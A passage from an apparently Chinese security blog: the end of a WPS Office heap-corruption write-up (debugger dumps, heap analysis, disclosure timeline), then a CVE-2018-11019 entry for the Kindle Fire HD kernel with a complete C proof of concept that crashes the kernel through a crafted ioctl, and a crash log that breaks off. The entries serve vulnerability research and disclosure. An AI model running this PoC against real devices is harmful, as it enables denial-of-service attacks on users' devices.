dc esi+0B4hcb07decc cf69afbc c0c0c000 00000000 00000100 ..i.............cb07dedc c0c0c0c0 00000000 00000000 00000000 ................cb07deec 00000000 00000000 00000000 00000000 ................cb07defc 00000000 cf030fd0 00000000 00000000 ................cb07df0c 00000000 00000000 00000000 00000000 ................cb07df1c c0c0c0c0 00000000 3ff00000 00000000 ...........?....cb07df2c 00000000 00000000 00000000 00000000 ................cb07df3c 00000000 00000000 3ff00000 00000000 ...........?....0:000&gt; dc cf69afbccf69afbc c88baf80 d1326100 00000003 00000280 .....a2.........cf69afcc 0000055f 00000012 c0c0c0c0 1c3870e2 _............p8.cf69afdc 40ad870e 1c3870e2 40ad870e 00000000 ...@.p8....@....cf69afec 00000000 c0c0c0c1 6c1d12c0 00000000 ...........l....cf69affc c0c0c0c0 ???????? ???????? ???????? ....????????????cf69b00c ???????? ???????? ???????? ???????? ????????????????cf69b01c ???????? ???????? ???????? ???????? ????????????????cf69b02c ???????? ???????? ???????? ???????? ????????????????0:000&gt; dc c88baf80c88baf80 00000001 0000001c 00000010 00000001 ................c88baf90 ff000000 ff800000 ff008000 ff808000 ................c88bafa0 ff000080 ff800080 ff008080 ff808080 ................c88bafb0 ffc0c0c0 ffff0000 ff00ff00 ffffff00 ................c88bafc0 ff0000ff ffff00ff ff00ffff ffffffff ................c88bafd0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................c88bafe0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................c88baff0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ 从这里我们可以知道代码实际上没有从指针释放任何东西。一旦移至EDX，EDX将保留指向索引数组的指针： 12345678910111213141516171819202122232425eax=00000000 ebx=00791878 ecx=00000005 edx=cf69afbc esi=cb07de18 edi=0000001ceip=6ba3cb8f esp=00791780 ebp=00791870 iopl=0 nv up ei pl nz na po nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00200202QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a6b:6ba3cb8f 8b4df4 mov ecx,dword ptr [ebp-0Ch] ss:002b:00791864=d13261000:000&gt; dc cf69afbccf69afbc c88baf80 d1326100 00000003 00000280 .....a2.........cf69afcc 0000055f 00000012 c0c0c0c0 1c3870e2 _............p8.cf69afdc 40ad870e 1c3870e2 40ad870e 00000000 ...@.p8....@....cf69afec 00000000 c0c0c0c1 6c1d12c0 00000000 ...........l....cf69affc c0c0c0c0 ???????? ???????? ???????? ....????????????cf69b00c ???????? ???????? ???????? ???????? ????????????????cf69b01c ???????? ???????? ???????? ???????? ????????????????cf69b02c ???????? ???????? ???????? ???????? ????????????????0:000&gt; dc c88baf80c88baf80 00000001 0000001c 00000010 00000001 ................c88baf90 ff000000 ff800000 ff008000 ff808000 ................c88bafa0 ff000080 ff800080 ff008080 ff808080 ................c88bafb0 ffc0c0c0 ffff0000 ff00ff00 ffffff00 ................c88bafc0 ff0000ff ffff00ff ff00ffff ffffffff ................c88bafd0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................c88bafe0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................c88baff0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ 崩溃后的堆栈跟踪： 123456789101112130:000&gt; kvL # ChildEBP RetAddr Args to Child 00 012f18d4 6ba3cb98 cc53afbc 00000048 00000000 QtCore4!QMatrix::dy+0x48a801 012f19d0 6b8143ef 00000000 012f1b78 012f1a5c QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a7402 012f1a30 6b814259 0000002e 012f5bd0 00000000 QtCore4!QBrush::setMatrix+0x23403 012f5b14 6b8249a4 0000003b 012f5b68 cc780e18 QtCore4!QBrush::setMatrix+0x9e04 012f5b2c 6b80cc84 0000003b 012f5b68 cc780e18 QtCore4!QImage::rect+0x22b05 012f5b48 6b857ccc 0000003b 012f5b68 cc780e18 QtCore4!QTransform::inverted+0xec806 012f64dc 6b81c55b 00000000 003c0000 00000000 QtCore4!QSvgFillStyle::setFillOpacity+0x1b5907 012f66c0 6b896844 012f6724 cc818ff0 0000001c QtCore4!QPainter::drawPixmap+0x1c9808 012f67b4 6d1e0fbd 012f69ec 012f66d4 012f6864 QtCore4!QPainter::drawImage+0x32509 012f67d4 6d0dd155 012f6a54 012f69ec 012f6864 kso!GdiDrawHoriLineIAlt+0x11a1a0a 012f67ec 6d0c8d88 012f69ec 012f68e0 012f6864 kso!kpt::PainterExt::drawBitmap+0x23 堆分析： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546470:000&gt; !heap -p -a cc53afbc address cc53afbc found in _DPH_HEAP_ROOT @ 6731000 in busy allocation ( DPH_HEAP_BLOCK: UserAddr UserSize - VirtAddr VirtSize) cc36323c: cc53afa8 58 - cc53a000 2000 6f13ab70 verifier!AVrfDebugPageHeapAllocate+0x00000240 77a9909b ntdll!RtlDebugAllocateHeap+0x00000039 779ebbad ntdll!RtlpAllocateHeap+0x000000ed 779eb0cf ntdll!RtlpAllocateHeapInternal+0x0000022f 779eae8e ntdll!RtlAllocateHeap+0x0000003e 6f080269 MSVCR100!malloc+0x0000004b 6f08233b MSVCR100!operator new+0x0000001f 6b726c67 QtCore4!QImageData::create+0x000000fa 6b726b54 QtCore4!QImage::QImage+0x0000004e 6b7a0e21 QtCore4!png_get_text+0x00000436 6b79d7a8 QtCore4!QImageIOHandler::setFormat+0x000000de 6b79d457 QtCore4!QPixmapData::fromFile+0x000002bf 6b725eb4 QtCore4!QImageReader::read+0x000001e2 6d0ca585 kso!kpt::VariantImage::forceUpdateCacheImage+0x0000254e 6d0c5964 kso!kpt::Direct2DPaintEngineHelper::operator=+0x00000693 6d0c70d0 kso!kpt::RelativeRect::unclipped+0x00001146 6d0c8d0c kso!kpt::VariantImage::forceUpdateCacheImage+0x00000cd5 6d451d5c kso!BlipCacheMgr::BrushCache+0x0000049a 6d451e85 kso!BlipCacheMgr::GenerateBitmap+0x0000001d 6d453227 kso!BlipCacheMgr::GenCachedBitmap+0x00000083 6d29bb92 kso!drawing::PictureRenderLayer::render+0x000009b6 6d450fb1 kso!drawing::RenderTargetImpl::paint+0x00000090 6d29b528 kso!drawing::PictureRenderLayer::render+0x0000034c 6d2a2d83 kso!drawing::VisualRenderer::render+0x00000060 6d2b8970 kso!drawing::SingleVisualRenderer::drawNormal+0x000002b5 6d2b86a7 kso!drawing::SingleVisualRenderer::draw+0x000001e1 6d2b945e kso!drawing::SingleVisualRenderer::draw+0x00000046 6d3d0142 kso!drawing::ShapeVisual::paintEvent+0x0000044a 680a2b5c wpsmain!WpsShapeTreeVisual::getHittestSubVisuals+0x000068f1 6d0e36df kso!AbstractVisual::visualEvent+0x00000051 6d3cbe97 kso!drawing::ShapeVisual::visualEvent+0x0000018f 6d0eba90 kso!VisualPaintEvent::arriveVisual+0x0000004e0:000&gt; dt _DPH_BLOCK_INFORMATION cc780e18-0x20verifier!_DPH_BLOCK_INFORMATION +0x000 StartStamp : 0xc0c0c0c0 +0x004 Heap : 0xc0c0c0c0 Void +0x008 RequestedSize : 0xc0c0c0c0 +0x00c ActualSize : 0xc0c0c0c0 +0x010 Internal : _DPH_BLOCK_INTERNAL_INFORMATION +0x018 StackTrace : 0xc0c0c0c0 Void +0x01c EndStamp : 0xc0c0c0c0 段中的最后一个堆条目通常是一个空闲块。堆块的状态指示为空闲块。堆块声明前一个块的大小为00108，而当前块的大小为00a30。前一块报告其自身大小为0x20字节，不匹配。位置为05f61000的堆块的使用似乎是该堆块的使用导致以下块的元数据损坏的可能性。堆块： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950510:000&gt; !heap -a 05f60000 Index Address Name Debugging options enabled 1: 05f60000 Segment at 05f60000 to 0605f000 (00001000 bytes committed) Flags: 00000002 ForceFlags: 00000000 Granularity: 8 bytes Segment Reserve: 00100000 Segment Commit: 00002000 DeCommit Block Thres: 00000200 DeCommit Total Thres: 00002000 Total Free Size: 00000146 Max. Allocation Size: fffdefff Lock Variable at: 05f60258 Next TagIndex: 0000 Maximum TagIndex: 0000 Tag Entries: 00000000 PsuedoTag Entries: 00000000 Virtual Alloc List: 05f6009c Uncommitted ranges: 05f6008c 05f61000: 000fe000 (1040384 bytes) FreeList[ 00 ] at 05f600c0: 05f605b8 . 05f605b8 05f605b0: 00108 . 00a30 [100] - free Segment00 at 05f60000: Flags: 00000000 Base: 05f60000 First Entry: 05f604a8 Last Entry: 0605f000 Total Pages: 000000ff Total UnCommit: 000000fe Largest UnCommit:00000000 UnCommitted Ranges: (1) Heap entries for Segment00 in Heap 05f60000 address: psize . size flags state (requested size) 05f60000: 00000 . 004a8 [101] - busy (4a7) 05f604a8: 004a8 . 00108 [101] - busy (107) Internal 05f605b0: 00108 . 00a30 [100] 05f60fe0: 00a30 . 00020 [111] - busy (1d) 05f61000: 000fe000 - uncommitted bytes.0:000&gt; dd 05f60fe005f60fe0 a9b3c836 03007087 05f6008c 05f6008c05f60ff0 05f60038 05f60038 05f61000 000fe00005f61000 ???????? ???????? ???????? ????????05f61010 ???????? ???????? ???????? ????????05f61020 ???????? ???????? ???????? ????????05f61030 ???????? ???????? ???????? ????????05f61040 ???????? ???????? ???????? ????????05f61050 ???????? ???????? ???????? ???????? 披露时间表该漏洞于2020年8月报告。披露时间表： 2020-08-04-将电子邮件发送到公开提供的WPS的各种邮件列表（销售和支持）。 2020-08-10-WPS团队回应该报告可以转发给他们。 2020-08-11-要求进一步的信息，例如咨询和向适当的渠道披露等。 2020-08-17-根据先前的要求与WPS团队进行跟进。 2020-08-18-WPS团队做出回应，他们会照顾好它，并转交给开发团队。 2020-08-18-通过电子邮件提供技术报告和概念验证（未加密）。 2020-08-25-WPS跟进报告进度。 2020-08-26-WPS更新说此问题已转发给开发团队。 2020-08-28-WPS发送了一封电子邮件，指出该问题已在最新的下载版本11.2.0.9403中得到解决。 2020-08-28-针对提供的PoC测试了新版本，并确认问题已解决。 2020-08-28-向WPS团队寻求咨询或更改日志更新。 2020-08-31-WPS团队通知他们不再更新或维护任何安全公告。 2020-09-03-漏洞写信 要求CVE。 参考链接：http://zeifan.my/security/rce/heap/2020/09/03/wps-rce-heap.html","link":"/2020/09/13/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/Exploit/%E9%87%91%E5%B1%B1WPS-Office%E8%BF%9C%E7%A8%8B%E5%A0%86%E6%8D%9F%E5%9D%8F%E6%BC%8F%E6%B4%9E/"},{"title":"（CVE-2018-11019）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞","text":"一、漏洞简介 Amazon Kindle Fire HD（3rd）是美国亚马逊（Amazon）公司的一款Fire OS平板电脑设备。Fire OS是运行在其中的一套专用于Amazon设备的基于Android开发的移动操作系统。kernel是其中的一个内核组件。 Amazon Kindle Fire HD(3rd) Fire OS 4.5.5.3版本中的kernel组件的kernel/omap/drivers/misc/gcx/gcioctl/gcif.c文件存在安全漏洞。攻击者可借助3221773726命令利用该漏洞注入特制的参数，造成内核崩溃。 二、漏洞影响Fire OS 4.5.5.3 三、复现过程poc - 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213/* * This is poc of Kindle Fire HD 3rd * A bug in the ioctl interface of device file /dev/dsscomp causes the system crash via IOCTL 1118064517. * Related buggy struct name is dsscomp_setup_dispc_data. * This Poc should run with permission to do ioctl on /dev/dsscomp. * * The fowllwing is kmsg of kernel crash infomation: * * */#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#include &lt;errno.h&gt;#include &lt;sys/ioctl.h&gt;const static char *driver = &quot;/dev/dsscomp&quot;;static command = 1118064517; int main(int argc, char **argv, char **env) { unsigned int payload[] = { 0xffffffff, 0x00000003, 0x5d200040, 0x79900008, 0x8f5928bd, 0x78b02422, 0x00000000, 0xffffffff, 0xf4c50400, 0x007fffff, 0x8499f562, 0xffff0400, 0x001b131d, 0x60818210, 0x00000007, 0xffffffff, 0x00000000, 0x9da9041c, 0xcd980400, 0x001f03f4, 0x00000007, 0x2a34003f, 0x7c80d8f3, 0x63102627, 0xc73643a8, 0xa28f0665, 0x00000000, 0x689e57b4, 0x01ff0008, 0x5e7324b1, 0xae3b003f, 0x0b174d86, 0x00000400, 0x21ffff37, 0xceb367a4, 0x00000040, 0x00000001, 0xec000f9e, 0x00000001, 0x000001ff, 0x00000000, 0x00000000, 0x0000000f, 0x0425c069, 0x038cc3be, 0x0000000f, 0x00000080, 0xe5790100, 0x5b1bffff, 0x0000d355, 0x0000c685, 0xa0070000, 0x0010ffff, 0x00a0ff00, 0x00000001, 0xff490700, 0x0832ad03, 0x00000006, 0x00000002, 0x00000001, 0x81f871c0, 0x738019cb, 0xbf47ffff, 0x00000040, 0x00000001, 0x7f190f33, 0x00000001, 0x8295769b, 0x0000003f, 0x869f2295, 0xffffffff, 0xd673914f, 0x05055800, 0xed69b7d5, 0x00000000, 0x0107ebbd, 0xd214af8d, 0xffff4a93, 0x26450008, 0x58df0000, 0xd16db084, 0x03ff30dd, 0x00000001, 0x209aff3b, 0xe7850800, 0x00000002, 0x30da815c, 0x426f5105, 0x0de109d7, 0x2c1a65fc, 0xfcb3d75f, 0x00000000, 0x00000001, 0x8066be5b, 0x00000002, 0xffffffff, 0x5cf232ec, 0x680d1469, 0x00000001, 0x00000020, 0xffffffff, 0x00000400, 0xd1d12be8, 0x02010200, 0x01ffc16f, 0xf6e237e6, 0x007f0000, 0x01ff08f8, 0x000f00f9, 0xbad07695, 0x00000000, 0xbaff0000, 0x24040040, 0x00000006, 0x00000004, 0x00000000, 0xbc2e9242, 0x009f5f08, 0x00800000, 0x00000000, 0x00000001, 0xff8800ff, 0x00000001, 0x00000000, 0x000003f4, 0x6faa8472, 0x00000400, 0xec857dd5, 0x00000000, 0x00000040, 0xffffffff, 0x3f004874, 0x0000b77a, 0xec9acb95, 0xfacc0001, 0xffff0001, 0x0080ffff, 0x3600ff03, 0x00000001, 0x8fff7d7f, 0x6b87075a, 0x00000000, 0x41414141, 0x41414141, 0x41414141, 0x41414141, 0x001001ff, 0x00000000, 0x00000001, 0xff1f0512, 0x00000001, 0x51e32167, 0xc18c55cc, 0x00000000, 0xffffffff, 0xb4aaf12b, 0x86edfdbd, 0x00000010, 0x0000003f, 0xabff7b00, 0xffff9ea3, 0xb28e0040, 0x000fffff, 0x458603f4, 0xffff007f, 0xa9030f02, 0x00000001, 0x002cffff, 0x9e00cdff, 0x00000004, 0x41414141, 0x41414141, 0x41414141, 0x41414141 }; int fd = 0; fd = open(driver, O_RDWR); if (fd &lt; 0) { printf(&quot;Failed to open %s, with errno %d\\n&quot;, driver, errno); system(&quot;echo 1 &gt; /data/local/tmp/log&quot;); return -1; } printf(&quot;Try open %s with command 0x%x.\\n&quot;, driver, command); printf(&quot;System will crash and reboot.\\n&quot;); if(ioctl(fd, command, &amp;payload) &lt; 0) { printf(&quot;Allocation of structs failed, %d\\n&quot;, errno); system(&quot;echo 2 &gt; /data/local/tmp/log&quot;); return -1; } close(fd); return 0;} 崩溃日志 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180[ 164.793151] Unable to handle kernel NULL pointer dereference at virtual address 00000037[ 164.802459] pgd = c26ec000[ 164.805664] [00000037] *pgd=82f42831, *pte=00000000, *ppte=00000000[ 164.813415] Internal error: Oops: 17 [#1] PREEMPT SMP ARM[ 164.819458] Modules linked in: omaplfb(O) pvrsrvkm(O) pvr_logger(O)[ 164.827239] CPU: 1 Tainted: G O (3.4.83-gd2afc0bae69 #1)[ 164.834686] PC is at dev_ioctl+0x4ac/0x10c4[ 164.839416] LR is at down_timeout+0x40/0x5c[ 164.844146] pc : [&lt;c03178e8&gt;] lr : [&lt;c006e9b8&gt;] psr: 60000013[ 164.844146] sp : c25a1e70 ip : c25a1e50 fp : c25a1f04[ 164.857116] r10: 00000000 r9 : d8c0aca8 r8 : bed5c610[ 164.863128] r7 : c0a25b50 r6 : c25a0000 r5 : bed5c610 r4 : 0000000f[ 164.870391] r3 : 00001403 r2 : 00000000 r1 : 20000013 r0 : 00000000[ 164.877807] Flags: nZCv IRQs on FIQs on Mode SVC_32 ISA ARM Segment user[ 164.885894] Control: 10c5387d Table: 826ec04a DAC: 00000015[ 164.892303] [ 164.892333] PC: 0xc0317868:[ 164.897308] 7868 30d22003 33a03000 e3530000 0a0001c5 e3e0500d eaffff02 e1a0200d e3c26d7f[ 164.907989] 7888 e3c6603f e5963008 e2952008 30d22003 33a03000 e3530000 1a000021 e24b3064[ 164.918670] 78a8 e1a01005 e3a02008 e50b3088 e1a00003 ebfcfa5f e3500000 1a00001e e51b4060[ 164.929351] 78c8 e3020710 e59f7bdc ebf4db32 e1a01000 e2870038 ebf55c25 e3500000 1a0002e0[ 164.939880] 78e8 e5943028 e1a08000 e5940024 e1a02007 e2841024 e5803004 e5830000 e5b23070[ 164.950561] 7908 e5871070 e2420038 e5831004 e5843024 e5842028 ebf55bb9 e50b8060 e50b8064[ 164.961212] 7928 ea000006 e24b1064 e50b1088 e51b0088 e3a01008 ebfd0387 e3a03004 e50b3064[ 164.971771] 7948 e5963008 e2952008 30d22003 33a03000 e3530000 1affffc5 e1a00005 e51b1088[ 164.982299] [ 164.982330] LR: 0xc006e938:[ 164.987426] e938 e1a01000 0a000007 e3a05000 e2433001 e5843008 e1a00004 eb18d7ad e1a00005[ 164.997955] e958 e24bd014 e89da830 e1a00004 e50b1018 eb18d135 e51b1018 e1a05000 eafffff4[ 165.008636] e978 e1a0c00d e92dd878 e24cb004 e1a04000 e1a05001 eb18d91b e5943008 e3530000[ 165.019317] e998 e1a06000 0a000007 e3a05000 e2433001 e5843008 e1a00004 e1a01006 eb18d794[ 165.029846] e9b8 e1a00005 e89da878 e1a01005 e1a00004 eb18d158 e1a05000 eafffff5 e1a0c00d[ 165.040374] e9d8 e92dd800 e24cb004 e5903000 e1a0c000 e3530000 0a00000b e5910008 e5932008[ 165.051055] e9f8 e1500002 da000003 ea000006 e5932008 e1520000 ba000003 e283c004 e5933004[ 165.061737] ea18 e3530000 1afffff8 e5813004 f57ff05f e3a00000 e58c1000 e89da800 e1a0c00d[ 165.072265] [ 165.072265] SP: 0xc25a1df0:[ 165.077362] 1df0 00000001 00000004 d454d000 0000001d c25a1e3c c03178e8 60000013 ffffffff[ 165.087890] 1e10 c25a1e5c bed5c610 c25a1f04 c25a1e28 c06a5318 c0008370 00000000 20000013[ 165.098419] 1e30 00000000 00001403 0000000f bed5c610 c25a0000 c0a25b50 bed5c610 d8c0aca8[ 165.109100] 1e50 00000000 c25a1f04 c25a1e50 c25a1e70 c006e9b8 c03178e8 60000013 ffffffff[ 165.119781] 1e70 00000001 00000028 000fffff c25a1ea0 c25a1edc c25a1e90 c0207454 c00bd920[ 165.130340] 1e90 0000001e c2db9600 c25a1ed4 c25a1ea8 ffffffff 0000000f 00000000 ffffffff[ 165.141021] 1eb0 00000002 00000001 00000000 c25a1f14 00000000 00000001 d8c0aca8 d70c5580[ 165.151702] 1ed0 c25a1efc c25a1ee0 c02089fc 00000000 c719ab40 00000004 c719ab40 bed5c610[ 165.162353] [ 165.162384] IP: 0xc25a1dd0:[ 165.167327] 1dd0 c0070df8 c00795ac c25a0000 00000001 00000004 d454d0f4 60000013 00000001[ 165.178009] 1df0 00000001 00000004 d454d000 0000001d c25a1e3c c03178e8 60000013 ffffffff[ 165.188537] 1e10 c25a1e5c bed5c610 c25a1f04 c25a1e28 c06a5318 c0008370 00000000 20000013[ 165.199249] 1e30 00000000 00001403 0000000f bed5c610 c25a0000 c0a25b50 bed5c610 d8c0aca8[ 165.209899] 1e50 00000000 c25a1f04 c25a1e50 c25a1e70 c006e9b8 c03178e8 60000013 ffffffff[ 165.220581] 1e70 00000001 00000028 000fffff c25a1ea0 c25a1edc c25a1e90 c0207454 c00bd920[ 165.231109] 1e90 0000001e c2db9600 c25a1ed4 c25a1ea8 ffffffff 0000000f 00000000 ffffffff[ 165.241790] 1eb0 00000002 00000001 00000000 c25a1f14 00000000 00000001 d8c0aca8 d70c5580[ 165.252441] [ 165.252441] FP: 0xc25a1e84:[ 165.257415] 1e84 c25a1e90 c0207454 c00bd920 0000001e c2db9600 c25a1ed4 c25a1ea8 ffffffff[ 165.268066] 1ea4 0000000f 00000000 ffffffff 00000002 00000001 00000000 c25a1f14 00000000[ 165.278717] 1ec4 00000001 d8c0aca8 d70c5580 c25a1efc c25a1ee0 c02089fc 00000000 c719ab40[ 165.289276] 1ee4 00000004 c719ab40 bed5c610 d8c0aca8 00000000 c25a1f74 c25a1f08 c0136044[ 165.299926] 1f04 c0317448 00000000 00000000 00000000 00000001 00000000 dd045190 dcf8c440[ 165.310607] 1f24 c25a1f0c c25a0000 bed5c638 bed5c610 c0085d9e c719ab40 00000004 c25a0000[ 165.321136] 1f44 00000000 c25a1f64 00000000 bed5c610 c0085d9e c719ab40 00000004 c25a0000[ 165.331695] 1f64 00000000 c25a1fa4 c25a1f78 c01365e0 c0135fc4 00000000 00000000 00000400[ 165.342346] [ 165.342376] R6: 0xc259ff80:[ 165.347320] ff80 00000093 00000093 0000008d 00000002 00000000 00000000 00000000 00000000[ 165.358001] ffa0 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000[ 165.368682] ffc0 00000093 00000093 0000008d 00000002 00000000 00000000 00000000 00000000[ 165.379241] ffe0 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000[ 165.389770] 0000 00000000 00000002 00000000 d72b0980 c0a0e840 00000001 00000015 c265dc00[ 165.400451] 0020 00000000 c25a0000 c09ddc50 d72b0980 de949300 c1620b40 c25a1b7c c25a1ac8[ 165.411132] 0040 c06a36e4 00000000 00000000 00000000 00000000 00000000 01000000 00000000[ 165.421661] 0060 005634c0 5ebcc27f 00000000 00000000 00000000 00000000 00000000 00000000[ 165.432342] [ 165.432342] R7: 0xc0a25ad0:[ 165.437316] 5ad0 00010105 01010005 01040901 00040001 ffff0101 00000000 00000000 00040b03[ 165.447875] 5af0 01040101 ffff0100 00000000 00000000 0000ffff 00000000 0e0c0000 01010005[ 165.458526] 5b10 01000105 0000ffff 00000000 0e0c0000 01010005 00000105 01040901 00040001[ 165.469207] 5b30 ffff0101 00000000 00000000 00040b03 01040101 3f3f0100 00010001 01000001[ 165.479736] 5b50 00000000 00000000 00000001 c0a25b5c c0a25b5c c0a25b64 c0a25b64 00000000[ 165.490417] 5b70 00000000 00000001 c0a25b78 c0a25b78 c0a25b80 c0a25b80 00000000 00000000[ 165.500946] 5b90 00000000 c0a25b94 c0a25b94 c0a25b9c c0a25b9c 00000000 00000000 00000001[ 165.511627] 5bb0 c0a25bb0 c0a25bb0 c0a25bb8 c0a25bb8 c0a25bc0 c0a25bc0 c0a25bc8 c0a25bc8[ 165.522186] [ 165.522186] R9: 0xd8c0ac28:[ 165.527282] ac28 d8c0ac28 d8c0ac28 00000000 00000000 00000000 c06bc674 000200da c09dda58[ 165.537841] ac48 00000000 00000000 d8c0ac50 d8c0ac50 00000000 c0aa5174 c0aa5174 c0aa5148[ 165.548492] ac68 5aefbbda 00000000 00000000 00000000 d8c0ac80 00000000 00000000 00000000[ 165.559020] ac88 00200000 00000000 00000000 d8c0ac94 d8c0ac94 dd3f6080 dd3f6080 00000000[ 165.569702] aca8 000521a4 000003e8 000003e8 00000000 00000000 00000000 c06b9600 dd150400[ 165.580261] acc8 d8c0ad80 dd3ede70 00001064 00000001 0fb00000 5aefbbda 2e19b832 5aefbbda[ 165.590911] ace8 2e19b832 5aefbbda 2e19b832 00000000 00000000 00000000 00000000 00000000[ 165.601593] ad08 00000000 00000000 00000000 00000000 00000001 00000000 00000000 d8c0ad24[ 165.612121] Process gcioctl_poc (pid: 3932, stack limit = 0xc25a02f8)[ 165.619445] Stack: (0xc25a1e70 to 0xc25a2000)[ 165.624359] 1e60: 00000001 00000028 000fffff c25a1ea0[ 165.633605] 1e80: c25a1edc c25a1e90 c0207454 c00bd920 0000001e c2db9600 c25a1ed4 c25a1ea8[ 165.642822] 1ea0: ffffffff 0000000f 00000000 ffffffff 00000002 00000001 00000000 c25a1f14[ 165.652038] 1ec0: 00000000 00000001 d8c0aca8 d70c5580 c25a1efc c25a1ee0 c02089fc 00000000[ 165.661102] 1ee0: c719ab40 00000004 c719ab40 bed5c610 d8c0aca8 00000000 c25a1f74 c25a1f08[ 165.670318] 1f00: c0136044 c0317448 00000000 00000000 00000000 00000001 00000000 dd045190[ 165.679565] 1f20: dcf8c440 c25a1f0c c25a0000 bed5c638 bed5c610 c0085d9e c719ab40 00000004[ 165.688781] 1f40: c25a0000 00000000 c25a1f64 00000000 bed5c610 c0085d9e c719ab40 00000004[ 165.697875] 1f60: c25a0000 00000000 c25a1fa4 c25a1f78 c01365e0 c0135fc4 00000000 00000000[ 165.707092] 1f80: 00000400 bed5c638 00010e64 00000000 00000036 c0013e08 00000000 c25a1fa8[ 165.716308] 1fa0: c0013c60 c0136578 bed5c638 00010e64 00000004 c0085d9e bed5c610 bed5c610[ 165.725402] 1fc0: bed5c638 00010e64 00000000 00000036 00000000 00000000 00000000 bed5c624[ 165.734619] 1fe0: 00000000 bed5c5f4 000106a4 0002918c 60000010 00000004 00000000 00000000[ 165.743835] Backtrace: [ 165.746856] [&lt;c031743c&gt;] (dev_ioctl+0x0/0x10c4) from [&lt;c0136044&gt;] (do_vfs_ioctl+0x8c/0x5b4)[ 165.756256] [&lt;c0135fb8&gt;] (do_vfs_ioctl+0x0/0x5b4) from [&lt;c01365e0&gt;] (sys_ioctl+0x74/0x84)[ 165.765502] [&lt;c013656c&gt;] (sys_ioctl+0x0/0x84) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0/0x30)[ 165.774780] r8:c0013e08 r7:00000036 r6:00000000 r5:00010e64 r4:bed5c638[ 165.783203] Code: e2870038 ebf55c25 e3500000 1a0002e0 (e5943028) [ 165.793060] Board Information: [ 165.793060] Revision : 0001[ 165.793060] Serial : 0000000000000000[ 165.793090] SoC Information:[ 165.793090] CPU : OMAP4470[ 165.793090] Rev : ES1.0[ 165.793121] Type : HS[ 165.793121] Production ID: 0002B975-000000CC[ 165.793121] Die ID : 1CC60000-50002FFF-0B00935D-11007004[ 165.793121] [ 165.844757] ---[ end trace aba846a2af6e75b7 ]---[ 165.850097] Kernel panic - not syncing: Fatal exception[ 165.856109] CPU0: stopping[ 165.859252] Backtrace: [ 165.862274] [&lt;c0018148&gt;] (dump_backtrace+0x0/0x10c) from [&lt;c0698bb8&gt;] (dump_stack+0x18/0x1c)[ 165.871643] r6:c09ddc50 r5:c09dc844 r4:00000000 r3:c0a0e950[ 165.878784] [&lt;c0698ba0&gt;] (dump_stack+0x0/0x1c) from [&lt;c0019bd8&gt;] (handle_IPI+0x190/0x1c4)[ 165.887908] [&lt;c0019a48&gt;] (handle_IPI+0x0/0x1c4) from [&lt;c00084fc&gt;] (gic_handle_irq+0x58/0x60)[ 165.897399] [&lt;c00084a4&gt;] (gic_handle_irq+0x0/0x60) from [&lt;c06a5380&gt;] (__irq_svc+0x40/0x70)[ 165.906707] Exception stack(0xd8dcfc38 to 0xd8dcfc80)[ 165.912384] fc20: c153a9f8 00000000[ 165.921600] fc40: 00000002 c153aa08 00000007 c153a9f8 d8d72210 b6eaf010 d8caee34 bab7375f[ 165.930816] fc60: 00000001 d8dcfcac 0009eded d8dcfc80 c010a5b4 c010a5fc 20070013 ffffffff[ 165.940032] r6:ffffffff r5:20070013 r4:c010a5fc r3:c010a5b4[ 165.947052] [&lt;c010a534&gt;] (follow_page+0x0/0x238) from [&lt;c010af94&gt;] (__get_user_pages+0x13c/0x3f0)[ 165.957031] [&lt;c010ae58&gt;] (__get_user_pages+0x0/0x3f0) from [&lt;c010b350&gt;] (get_user_pages+0x50/0x58)[ 165.967102] [&lt;c010b300&gt;] (get_user_pages+0x0/0x58) from [&lt;c00ff544&gt;] (get_user_pages_fast+0x64/0x7c)[ 165.977233] r4:d8caee3c[ 165.980468] [&lt;c00ff4e0&gt;] (get_user_pages_fast+0x0/0x7c) from [&lt;c01eeff0&gt;] (fuse_copy_fill+0x1bc/0x238)[ 165.990905] [&lt;c01eee34&gt;] (fuse_copy_fill+0x0/0x238) from [&lt;c01ef0a4&gt;] (fuse_copy_one+0x38/0x68)[ 166.000579] r6:d8dcdb00 r5:d8dce000 r4:d8dcfe24 r3:00000000[ 166.007690] [&lt;c01ef06c&gt;] (fuse_copy_one+0x0/0x68) from [&lt;c01efe64&gt;] (fuse_dev_do_read+0x3e4/0x69c)[ 166.017761] r4:dd243c00[ 166.020874] [&lt;c01efa80&gt;] (fuse_dev_do_read+0x0/0x69c) from [&lt;c01f03c0&gt;] (fuse_dev_read+0x84/0x9c)[ 166.030853] [&lt;c01f033c&gt;] (fuse_dev_read+0x0/0x9c) from [&lt;c0124ecc&gt;] (do_sync_read+0xb0/0xf0)[ 166.040222] r7:00000000 r6:00000000 r5:00000000 r4:00000000[ 166.047363] [&lt;c0124e1c&gt;] (do_sync_read+0x0/0xf0) from [&lt;c01258f4&gt;] (vfs_read+0xa4/0x148)[ 166.056488] [&lt;c0125850&gt;] (vfs_read+0x0/0x148) from [&lt;c01259d8&gt;] 